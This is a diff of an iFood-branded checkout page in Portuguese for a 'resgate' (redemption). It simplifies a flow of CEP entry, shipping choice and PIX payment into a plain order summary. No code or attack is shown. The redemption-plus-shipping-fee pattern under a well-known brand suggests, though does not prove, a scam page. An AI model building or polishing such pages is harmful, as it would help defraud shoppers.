@@ -46,38 +46,14 @@
     <main class="container">
         <section class="step" aria-hidden="false">
             <div class="step-header">
-                <span class="step-count">Checkout</span>
+                <span class="step-count">Resumo</span>
                 <div class="progress-bar">
                     <div class="progress" style="width: 100%"></div>
                 </div>
             </div>
 
-            <h2>Confirme e finalize seu resgate</h2>
-            <p class="checkout-lead">Falta pouco. Confirme os dados, escolha o frete e siga para o pagamento.</p>
-
-            <div class="checkout-flow" aria-label="Etapas do checkout">
-                <div id="checkout-step-cep" class="checkout-flow__item is-active">
-                    <span class="checkout-flow__index">1</span>
-                    <div>
-                        <strong>Confirmar CEP</strong>
-                        <small>Valide seu endereco</small>
-                    </div>
-                </div>
-                <div id="checkout-step-frete" class="checkout-flow__item">
-                    <span class="checkout-flow__index">2</span>
-                    <div>
-                        <strong>Escolher frete</strong>
-                        <small>Selecione a melhor opcao</small>
-                    </div>
-                </div>
-                <div id="checkout-step-final" class="checkout-flow__item">
-                    <span class="checkout-flow__index">3</span>
-                    <div>
-                        <strong>Ir para o PIX</strong>
-                        <small>Pagamento rapido e seguro</small>
-                    </div>
-                </div>
-            </div>
+            <h2>Resumo do pedido</h2>
+            <p>Confira seus dados antes de finalizar o resgate.</p>
 
             <div id="summary-block">
                 <div class="summary-card">
@@ -112,7 +88,6 @@
             <div class="freight-card">
                 <div id="freight-form">
                     <div class="freight-title">Calcular frete</div>
-                    <p class="freight-subtitle">Digite o CEP para liberar as opcoes de entrega disponiveis para sua regiao.</p>
                     <div class="input-group">
                         <input type="tel" id="checkout-cep" class="floating-input" placeholder=" " maxlength="9"
                             inputmode="numeric" autocomplete="postal-code" pattern="[0-9]{5}-[0-9]{3}">
@@ -175,17 +150,8 @@
                 </div>
             </div>
 
-            <div class="checkout-action-panel">
-                <div class="checkout-action-panel__top">
-                    <span class="checkout-action-label">Proximo passo</span>
-                    <strong id="checkout-next-step">Informe seu CEP para liberar os fretes</strong>
-                    <span id="checkout-selected-shipping" class="checkout-selected-shipping">Frete ainda nao selecionado.</span>
-                </div>
-                <button id="btn-finish" class="btn-primary" type="button">Selecione um frete para continuar</button>
-                <p class="checkout-security">Pagamento via PIX em ambiente seguro, com confirmacao automatica.</p>
-            </div>
-
-            <div class="action-stack action-stack--soft">
+            <div class="action-stack">
+                <button id="btn-finish" class="btn-primary hidden" type="button">Finalizar pedido</button>
                 <a class="btn-secondary" href="dados?return=checkout">Editar dados</a>
                 <a class="btn-secondary" href="endereco?return=checkout">Editar endereco</a>
             </div>
@@ -200,7 +166,7 @@
         <p>&copy; 2026 iFood. Todos os direitos reservados.</p>
     </footer>
 
-    <script src="script.js?v=6.9" defer></script>
+    <script src="script.js?v=7.1" defer></script>
 </body>
 
 </html>
